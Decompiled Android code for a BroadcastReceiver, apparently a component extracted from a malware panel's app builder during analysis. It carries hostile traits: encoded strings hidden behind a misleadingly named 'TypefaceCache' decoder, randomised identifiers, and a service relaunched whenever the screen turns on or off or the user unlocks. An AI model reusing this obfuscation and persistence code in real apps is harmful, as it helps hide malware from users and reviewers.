package app.mobilex.plus.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.Locale;
import v.s.GrNkWurIv2PyLjgXX118;
import v.s.jb8et6SZeK5TWMrJFxDX;
import v.s.umMdYoePNXvWWPn;
import v.s.y6jRGLEWNMir;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class UpdateLBAdapter extends BroadcastReceiver {
    public static final /* synthetic */ int dDIMxZXP1V8HdM = 0;

    static {
        TypefaceCache.obtain("00160066005F008600E400BA00FE008500020072005A009700E400BA00C0");
    }

    public static void dDIMxZXP1V8HdM(Context context) {
        y6jRGLEWNMir.b1EoSIRjJHO5(jb8et6SZeK5TWMrJFxDX.dDIMxZXP1V8HdM(umMdYoePNXvWWPn.w9sT1Swbhx3hs), null, new GrNkWurIv2PyLjgXX118(context, null, 1), 3);
    }

    public static void w9sT1Swbhx3hs(Context context, String str) {
        try {
            Intent intent = new Intent(context, (Class<?>) SyncQYAdapter.class);
            while (Locale.getDefault().toString().length() > 999) {
            }
            intent.setAction(str);
            context.startForegroundService(intent);
        } catch (Exception e) {
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048009300F100AD00C600E7003000730049009100F900BC00D700FD0063");
            e.getMessage();
        }
    }

    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        TypefaceCache.obtain("001000750049008200F500B1009200A2003500730055009300AA00FF");
        intent.getAction();
        String action = intent.getAction();
        if (action != null) {
            int iHashCode = action.hashCode();
            if (iHashCode != -2128145023) {
                if (iHashCode != -1454123155) {
                    if (iHashCode == 823795052 && action.equals("android.intent.action.USER_PRESENT")) {
                        TypefaceCache.obtain("00160065005E009500B000AF00C000A2003000730055009300B000F2009200A6002400710049008200E300AC00DB00B1002600360053008200F100AD00C600A500260077004F00C6");
                        w9sT1Swbhx3hs(context, TypefaceCache.obtain("00160045007E00B500CF008F00E0008200100053007500B3"));
                        dDIMxZXP1V8HdM(context);
                    }
                } else if (action.equals("android.intent.action.SCREEN_ON")) {
                    TypefaceCache.obtain("001000750049008200F500B100920088000D0036001600C700F100B800D500B5002600650048008E00E600BA009200AF002600770049009300F200BA00D300B30062");
                    w9sT1Swbhx3hs(context, TypefaceCache.obtain("00100055006900A200D5009100ED0088000D"));
                    dDIMxZXP1V8HdM(context);
                }
            } else if (action.equals("android.intent.action.SCREEN_OFF")) {
                TypefaceCache.obtain("001000750049008200F500B10092008800050050001B00CA00B000BE00D500A0003100730048009400F900A900D700E7002B0073005A009500E400BD00D700A600370037");
                w9sT1Swbhx3hs(context, TypefaceCache.obtain("00100055006900A200D5009100ED008800050050"));
                dDIMxZXP1V8HdM(context);
            }
        }
        String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
        y6jRGLEWNMir.l1V0lQr6TbwNKqHfXNbb(context);
    }
}
